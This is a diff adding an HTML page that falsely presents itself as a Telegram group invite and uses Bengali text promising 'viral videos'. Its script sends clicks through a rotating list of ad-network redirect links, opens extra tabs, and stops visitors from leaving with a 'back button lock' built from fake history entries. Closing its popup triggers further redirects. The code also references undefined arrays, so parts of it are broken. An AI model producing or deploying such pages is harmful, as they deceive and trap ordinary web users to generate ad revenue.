@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Telegram: Join Group Chat</title>
+
+<style>
+html, body {
+  margin:0;padding:0;width:100%;height:100%;background:#000;overflow:hidden;
+  display:flex;justify-content:center;align-items:center;
+}
+#imageLink {
+  width:100%;height:100%;display:flex;
+  justify-content:center;align-items:center;cursor:pointer;
+}
+#randomImage {
+  width:100%;height:100%;object-fit:contain;
+  display:block;user-select:none;-webkit-user-drag:none;
+}
+
+/* পপ-আপ */
+.back-popup{display:none;position:fixed;top:0;left:0;width:100%;height:100%;
+background:rgba(0,0,0,0.95);z-index:9999;justify-content:center;align-items:center}
+.back-popup.show{display:flex}
+.popup-content{background:linear-gradient(135deg,#111,#1a1a1a);
+border:2px solid #ff416c;border-radius:15px;padding:25px;max-width:90%;width:350px;
+text-align:center;position:relative;box-shadow:0 20px 60px rgba(255,65,108,0.4)}
+.popup-close{position:absolute;top:12px;right:15px;background:linear-gradient(45deg,#ff416c,#ff4b2b);
+color:white;border:none;width:38px;height:38px;border-radius:50%;font-size:22px;
+font-weight:bold;cursor:pointer;display:flex;align-items:center;justify-content:center}
+.popup-title{color:#ff416c;font-size:19px;margin-bottom:12px;text-shadow:0 0 15px #ff416c}
+.popup-text{color:#fff;font-size:15px;line-height:1.5}
+</style>
+</head>
+
+<body>
+
+<a id="imageLink">
+  <img id="randomImage" alt="Loading...">
+</a>
+
+<div class="back-popup" id="backPopup">
+  <div class="popup-content">
+    <button class="popup-close" id="popupClose">×</button>
+    <div class="popup-title">চলে যাবেন না</div>
+    <div class="popup-text">
+      এখানে আরো <strong>অনেক ভাইরাল ভিডিও রয়েছে</strong> এই টেলিগ্রাম গ্রুপে<br>
+      <span style="color:#ff416c">চলে গেলে মিস করবে ভাইরাল ভিডিও গুলো</span>
+    </div>
+  </div>
+</div>
+
+<script>
+
+// 🔗 links
+const sameTabLinks = [
+  "https://www.effectivecpmnetwork.com/jdb13ne9?key=eb4b1e89e7b09f2291562102846d77b6",
+  "https://www.effectivecpmnetwork.com/hya17gvh4?key=c25a5e847db6269d6a474ae63cf069fa",
+  "https://www.effectivecpmnetwork.com/r7q0acxx5?key=4f8d70cebe440e947d77bbc474cce6b5",
+  "https://www.effectivecpmnetwork.com/r7q0acxx5?key=4f8d70cebe440e947d77bbc474cce6b5",
+  "https://www.effectivecpmnetwork.com/hya17gvh4?key=c25a5e847db6269d6a474ae63cf069fa",
+  "https://www.effectivecpmnetwork.com/r7q0acxx5?key=4f8d70cebe440e947d77bbc474cce6b5",
+  "https://www.effectivecpmnetwork.com/jdb13ne9?key=eb4b1e89e7b09f2291562102846d77b6",
+  "https://www.effectivecpmnetwork.com/jdb13ne9?key=eb4b1e89e7b09f2291562102846d77b6",
+  "https://www.effectivecpmnetwork.com/r7q0acxx5?key=4f8d70cebe440e947d77bbc474cce6b5",
+  "https://www.effectivecpmnetwork.com/jdb13ne9?key=eb4b1e89e7b09f2291562102846d77b6",
+  "https://www.effectivecpmnetwork.com/hya17gvh4?key=c25a5e847db6269d6a474ae63cf069fa"
+];
+
+
+function rand(a){ return a[Math.floor(Math.random()*a.length)] }
+
+// ✅ SERIAL SYSTEM FIX
+function getNextLink(){
+  let index = parseInt(localStorage.getItem("linkIndex") || "0");
+  let link = sameTabLinks[index];
+
+  index = (index + 1) % sameTabLinks.length;
+  localStorage.setItem("linkIndex", index);
+
+  return link;
+}
+
+// image load
+document.addEventListener("DOMContentLoaded", () => {
+  document.getElementById('randomImage').src = rand(images);
+});
+
+// 🔥 IMAGE CLICK
+function triggerLinks(){
+
+  // new tab same page
+  const a = document.createElement('a');
+  a.href = window.location.href;
+  a.target = '_blank';
+  a.rel = 'noopener';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  // same tab serial
+  setTimeout(() => {
+    location.href = getNextLink();
+  }, 10);
+}
+
+// 🔥 POPUP CLOSE (FINAL FIX)
+function popupLinks(){
+
+  // new tab external
+  const a = document.createElement('a');
+  a.href = rand(newTabLinks);
+  a.target = '_blank';
+  a.rel = 'noopener';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+
+  // same tab serial (delay important)
+  setTimeout(() => {
+    location.href = getNextLink();
+  }, 50);
+}
+
+// click
+document.getElementById('imageLink').onclick = e => {
+  e.preventDefault();
+  triggerLinks();
+};
+
+// popup close
+document.getElementById('popupClose').onclick = () => {
+  document.getElementById('backPopup').classList.remove('show');
+  popupLinks();
+};
+
+// 🔥 BACK BUTTON LOCK
+let backPopupShown = false;
+
+history.pushState(null, null, location.href);
+history.pushState(null, null, location.href);
+
+window.onpopstate = () => {
+  if(!backPopupShown){
+    history.go(1);
+    backPopupShown = true;
+    document.getElementById('backPopup').classList.add('show');
+  } else {
+    history.go(1);
+  }
+};
+
+</script>
+
+</body>
+</html>
